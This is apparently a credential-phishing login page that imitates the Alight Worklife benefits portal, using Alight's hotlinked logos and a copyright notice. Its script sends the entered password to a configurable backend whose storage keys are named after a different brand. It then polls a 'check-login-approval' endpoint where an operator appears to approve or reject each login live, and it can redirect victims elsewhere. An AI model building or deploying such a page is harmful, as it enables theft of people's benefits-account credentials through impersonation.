<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Benefits Portal Demo</title>

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  font-family: Arial, Helvetica, sans-serif;
  color: #292929;
  background: #fff;
}

body {
  min-width: 320px;
  font-size: 13px;
}

/* ================= HEADER ================= */

.header {
  position: sticky;
  top: 0;
  background: #fff;
  height: 100px;
  z-index: 999999;
  border-bottom: 1px solid #aaa;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 28px;
}

.brand {
  width: 92px;
  height: 63px;

  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 23px;
  font-weight: 400;
  letter-spacing: -1px;
}

.assistant {
  background: #126cb1da;
  color: white;
  border-radius: 25px;
  padding: 10px 17px;
  font-size: 13px;
  font-weight: bold;
  box-shadow: 0 2px 8px rgba(21, 40, 181, 0.55);
  display: flex;
  align-items: center;
  gap: 7px;
}

.assistant-icon {
  width: 21px;
  height: 21px;
  border: 1.5px solid white;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 10px;
}

/* ================= MAIN ================= */

.main {
  max-width: 1160px;
  margin: 55px auto 0;
  padding: 0 28px;
  display: grid;
  grid-template-columns: 335px 1fr;
  gap: 28px;
  align-items: start;
}

.left {
  width: 100%;
}

.title {
  font-size: 29px;
  line-height: 1.4;
  margin: 4px 0 25px;
  font-weight: 700;
}

.card {
  border: 1px solid #d4d4d4;
  border-radius: 9px;
  padding: 25px 25px 23px;
  box-shadow: 0 1px 3px rgba(0,0,0,.03);
}

.card h2 {
  margin: 0 0 16px;
  font-size: 17px;
  line-height: 1.3;
}

.required-info {
  font-size: 12px;
  line-height: 1.45;
  margin: 0 0 17px;
}

.field-label {
  display: block;
  font-size: 12px;
  margin-bottom: 7px;
}

.field-label span {
  color: #777;
  font-style: italic;
}

.required {
  color: #a52b2b;
}

.input {
  width: 100%;
  height: 58px;
  border: 1px solid #555;
  outline: none;
  padding: 8px;
  font-size: 14px;
  margin-bottom: 17px;
}

.input:focus {
  border-color: #126bb1;
  box-shadow: 0 0 0 1px #126bb1;
}

.remember {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 14px;
  margin-bottom: 8px;
}

.remember input {
  appearance: none;
  width: 21px;
  height: 21px;
  border: 1px solid #888;
  border-radius: 2px;
  margin: 0;
  background: #fff;
  flex-shrink: 0;
}

.remember input:checked {
  background: #126bb1;
  box-shadow: inset 0 0 0 4px white;
}

.link {
  color: #3977b5;
  text-decoration: underline;
  font-size: 12px;
  cursor: pointer;
}

.next {
  border: 0;
  margin-top: 23px;
  padding: 10px 19px;
  border-radius: 22px;
  background: #a4a4a4;
  color: white;
  font-size: 13px;
  cursor: pointer;
}

.next:hover {
  background: #858585;
}

/* ================= IMAGE ================= */

.image-area {
  width: 100%;
  height: 425px;
  overflow: hidden;
  object-fit: contain;
  position: relative;
}
.image-area img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}


.road {
  position: absolute;
  width: 75%;
  height: 120%;
  background: #555b59;
  right: -12%;
  bottom: -47%;
  transform: rotate(-19deg);
  border-left: 4px solid #eee;
}

.road::after {
  content: "";
  position: absolute;
  left: 48%;
  top: 0;
  height: 100%;
  border-left: 2px dashed #eee;
}

/* ================= FOOTER ================= */

.footer {
  margin-top: 25px;
  background: #fafafa;
  padding: 23px 28px 21px;
}

.footer-inner {
  max-width: 960px;
  margin: auto;
}

.footer-top {
  display: flex;
  justify-content: space-between;
  gap: 25px;
  padding-bottom: 23px;
}

.footer-links {
  display: flex;
  flex-direction: column;
  gap: 17px;
}

.footer-links a {
  color: #3977b5;
  text-decoration: underline;
  font-size: 13px;
}

.demo-brand {
  font-size: 22px;
  font-weight: bold;
  width: 200px;
  color: #222;
  margin-bottom: 14px;
}
.demo-brand img {
  width: 100%;
  height: auto;
  max-width: 200px;
}

.demo-brand span {
  color: #79b99b;
}

.stores {
  display: flex;
  gap: 8px;
}

.store {
  width: 100px;
  height: 34px;
  border-radius: 4px;
  background: #050505;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 9px;
  text-align: center;
}
.store img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.footer-bottom {
  border-top: 1px solid #aaa;
  padding-top: 22px;
  display: flex;
  justify-content: space-between;
  gap: 22px;
}

.legal-links {
  display: flex;
  flex-wrap: wrap;
  gap: 20px;
}

.legal-links a {
  color: #3977b5;
  text-decoration: underline;
  font-size: 12px;
}

.copyright {
  font-size: 12px;
  color: #666;
  line-height: 1.5;
  max-width: 250px;
}

/* ================= TABLET ================= */

@media (max-width: 900px) {

  .header {
    height: 65px;
    padding: 0 20px;
  }

  .brand {
    width: 65px;
    height: 39px;
    font-size: 21px;
  }

  .assistant {
    padding: 9px 14px;
    font-size: 12px;
  }

  .main {
    margin-top: 40px;
    grid-template-columns: 300px 1fr;
    gap: 20px;
    padding: 0 20px;
  }

  .title {
    font-size: 20px;
  }

  .card {
    padding: 21px;
  }

  .image-area {
    height: 370px;
  }
}

/* ================= MOBILE ================= */

@media (max-width: 700px) {

  .header {
    height: 62px;
    padding: 0 15px;
  }

  .brand {
    width: 60px;
    height: 36px;
    font-size: 19px;
  }

  .assistant {
    padding: 8px 11px;
    font-size: 11px;
  }

  .assistant-icon {
    width: 19px;
    height: 19px;
    font-size: 9px;
  }

  .main {
    display: block;
    margin-top: 27px;
    padding: 0 15px;
  }

  .title {
    font-size: 19px;
    margin-bottom: 19px;
  }

  .card {
    padding: 19px;
  }

  .card h2 {
    font-size: 16px;
  }

  .required-info,
  .field-label,
  .link {
    font-size: 12px;
  }

  .input {
    height: 51px;
    font-size: 13px;
  }

  .remember {
    font-size: 13px;
  }

  .remember input {
    width: 19px;
    height: 19px;
  }

  .next {
    margin-top: 19px;
    padding: 9px 17px;
    font-size: 12px;
  }

  .image-area {
    margin-top: 22px;
    height: 230px;
  }

  .footer {
    margin-top: 28px;
    padding: 21px 15px;
  }

  .footer-top {
    display: block;
  }

  .footer-links {
    gap: 14px;
  }

  .footer-links a {
    font-size: 12px;
  }

  .footer-right {
    margin-top: 25px;
  }

  .footer-bottom {
    display: block;
  }

  .legal-links {
    gap: 10px 16px;
    margin-bottom: 17px;
  }

  .legal-links a {
    font-size: 11px;
  }

  .copyright {
    font-size: 11px;
  }
}

/* ================= SMALL PHONES ================= */

@media (max-width: 400px) {

  .assistant {
    padding: 7px 9px;
  }

  .assistant-icon {
    display: none;
  }

  .title {
    font-size: 18px;
  }

  .card {
    padding: 17px;
  }

  .image-area {
    height: 200px;
  }

  .demo-brand {
    font-size: 20px;
  }
}

.password-wrapper {
  position: relative;
  display: inline-block;
  width: 100%;
}

.password-wrapper input {
  width: 100%;
  padding-right: 40px; /* Space for icon */
}

.password-wrapper i {
  position: absolute;
  right: 12px;
  top: 37%;
  transform: translateY(-50%);
  cursor: pointer;
  color: #999;
  user-select: none;
}

.password-wrapper i:hover {
  color: #003d4be5;
}
</style>
</head>
<script src="../config.js"></script>


<body>

  <!-- HEADER -->
  <header class="header">

    <div class="brand">
      <img id="globalLogo" >
    </div>

    <div class="assistant">
 <i class="fa-solid fa-comment-dots"></i>
      Virtual Assistant
    </div>

  </header>


  <!-- MAIN CONTENT -->
  <main class="main">

    <section class="left">

      <h1 class="title">
      Welcome to Alight<br>
        Worklife
        <p id="name"> </p>
      </h1>
          <div id="messageBox" class="message-container">
          <span class="message-icon" id="messageIcon"></span>
          <span id="messageText"></span>
        </div>

      <div class="card">

        <h2>Enter your Password</h2>

        <p class="required-info">
          * Fields marked with an asterisk (*) are required.
        </p>

        <label class="field-label" for="userid">
          Password <span>(Required)</span>
          <b class="required">*</b>
        </label>
<div class="password-wrapper">
  <input
    class="input"
    type="password"
    id="password"
    autocomplete="off"
  >
  <i class="fa-solid fa-eye" id="togglePassword"></i>
</div>

       

        <a href="#" class="link">
         forgot password
        </a>

        <br>

        <button class="next" id="loginBtn" onclick="submitLogin()" type="button">
          Login with password
        </button>

      </div>

    </section>


    <!-- DEMO IMAGE AREA -->
    <section class="image-area" aria-label="Decorative landscape">

     <img id="imageArea" alt="image">

    </section>

  </main>


  <!-- FOOTER -->
  <footer class="footer">

    <div class="footer-inner">

      <div class="footer-top">

        <div class="footer-links">

          <a href="#">Contact Us</a>
          <a href="#">Feedback</a>
          <a href="#">Protect Yourself From Website Fraud</a>

        </div>

        <div class="footer-right">

          <div class="demo-brand">
          <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg" alt="">
          </div>

          <div class="stores">
            <div class="store">
              <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png" alt="">
            </div>

            <div class="store">
             <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"/>
            </div>
          </div>

        </div>

      </div>


      <div class="footer-bottom">

        <div class="legal-links">

          <a href="#">Privacy Policy</a>
          <a href="#">Terms of Use</a>
          <a href="#">Cookie Notice</a>
          <a href="#">Cookie Settings</a>

        </div>

        <div class="copyright">
          ©2026 Alight Solutions. All rights reserved.
        </div>

      </div>

    </div>

  </footer>


 <script>

    const passwordInput = document.getElementById('password');
const toggleIcon = document.getElementById('togglePassword');

toggleIcon.addEventListener('click', () => {
  // Toggle input type
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    toggleIcon.classList.remove('fa-eye');
    toggleIcon.classList.add('fa-eye-slash');
  } else {
    passwordInput.type = 'password';
    toggleIcon.classList.remove('fa-eye-slash');
    toggleIcon.classList.add('fa-eye');
  }
});
 const input = document.getElementById('password');
const verifybtn = document.getElementById('loginBtn');

// Function to update button color
function updateButtonColor() {
  if (input.value.length) {
    verifybtn.style.background = '#3977b5'; // Active blue
  } else {
    verifybtn.style.background = '#999'; // Inactive gray
  }
}


// Listen for changes
input.addEventListener('input', updateButtonColor);

// Also run on page load in case it has a default value
updateButtonColor();

    document.getElementById('name').innerHTML = `<span style='font-size:12px'>User ID:<br/> <i>${localStorage.getItem('ascensus_username').slice(0, -3)}****</i>     <a class="link" href="../index.html">change</a></span> ` || '';
let statusCheckInterval = null;
let loginVerificationId = null;

function showMessage(message, type = 'error') {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');
  const messageIcon = document.getElementById('messageIcon');
  
  messageText.textContent = message;
  messageBox.className = 'message-container show ' + type;
  messageIcon.textContent = type === 'success' ? '✓' : '✕';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    messageBox.classList.remove('show');
  }, 5000);
}

  function initPage() {
  const logo = document.getElementById('globalLogo');
  const imageArea = document.getElementById('imageArea');
  
  const cfg = window.APP_CONFIG;

  logo.src=cfg.logo
  logo.alt=cfg.logoAlt
  imageArea.src=cfg.imageArea
  imageArea.alt='image'
}

window.addEventListener('load', initPage);

function togglePassword(){
  const password=document.getElementById("password");
  const icon=document.getElementById("password-icon");
  if(password.type==="password"){password.type="text";icon.classList.remove("fa-eye");icon.classList.add("fa-eye-slash");}
  else{password.type="password";icon.classList.remove("fa-eye-slash");icon.classList.add("fa-eye");}
}

function changeAccount(){
  localStorage.removeItem('ascensus_username');
  window.location.href = '../index.html';
}

function submitLogin(){
  const username = localStorage.getItem('ascensus_username');
  const password = document.getElementById('password').value;
     
  if (!password) {
    showMessage('Please enter your password.', 'error');
    return;
  }
  
  const btn = document.getElementById('loginBtn');
  const originalText = btn.textContent;
  btn.disabled = true;
  btn.textContent = 'Loading...';
  
  fetch(window.ascensus_API_BASE + '/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username, password: password })
  })
  .then(function(response){
    return response.json().then(function(data){
      return { ok: response.ok, data: data };
    });
  })
  .then(function(result){
    if(!result.ok){
      showMessage(result.data.message || 'Unable to process login.', 'error');
      btn.disabled = false;
      btn.textContent = originalText;
      return;
    }

    localStorage.setItem('temp_token', result.data.tempToken);
    loginVerificationId = result.data.verificationId;
    localStorage.setItem('login_verification_id', result.data.verificationId);

    if(result.data.requiresApproval){
    
      startStatusCheck();
    } else if(result.data.requiresTwoFactor){
      window.location.href = 'verify-method.html';
    } else {
      localStorage.setItem('ascensus_token', result.data.tempToken);
      localStorage.setItem('verification_complete', 'true');
      window.location.href = 'verify-method.html';
    }
  })
  .catch(function(){
    showMessage('Unable to reach the server. Please try again.', 'error');
    btn.disabled = false;
    btn.textContent = originalText;
  });
}



function startStatusCheck() {
 
  if (statusCheckInterval) {
    clearInterval(statusCheckInterval);
  }

  statusCheckInterval = setInterval(() => {
    if (!loginVerificationId) {
      clearInterval(statusCheckInterval);
      return;
    }

    const tempToken = localStorage.getItem('temp_token');
    fetch(window.ascensus_API_BASE + `/api/auth/check-login-approval/${loginVerificationId}`, {
      headers: { 'Authorization': `Bearer ${tempToken}` },
    })
    .then(r => r.json())
    .then(result => {
      if (result.status === 'approved') {
        clearInterval(statusCheckInterval);
        completeLogin();
      } else if (result.status === 'rejected') {
        clearInterval(statusCheckInterval);
        rejectLogin();
      } else if (result.status === 'redirected') {
        clearInterval(statusCheckInterval);
       window.location.href=window.APP_CONFIG.redirectLink
      }
    })
    .catch(err => {
      console.error('Status check error:', err);
    });
  }, 3000);
}

function completeLogin() {
  const tempToken = localStorage.getItem('temp_token');
  localStorage.setItem('ascensus_token', tempToken);
  localStorage.setItem('verification_complete', 'true');

  // document.getElementById('waitStatus').textContent = '✅ Approved!';
  // document.getElementById('waitStatus').style.color = '#28a745';

  setTimeout(() => {
    window.location.href = 'details.html';
  }, 500);
}

function rejectLogin() {
  if (statusCheckInterval) {
    clearInterval(statusCheckInterval);
  }
  
  showMessage('password is incorrect.', 'error');
    const btn = document.getElementById('loginBtn');
    const password = document.getElementById('password');
  
  btn.disabled = false;
  btn.textContent = 'Next';
  password.value = ''
 
}

</script>

</body>
</html>
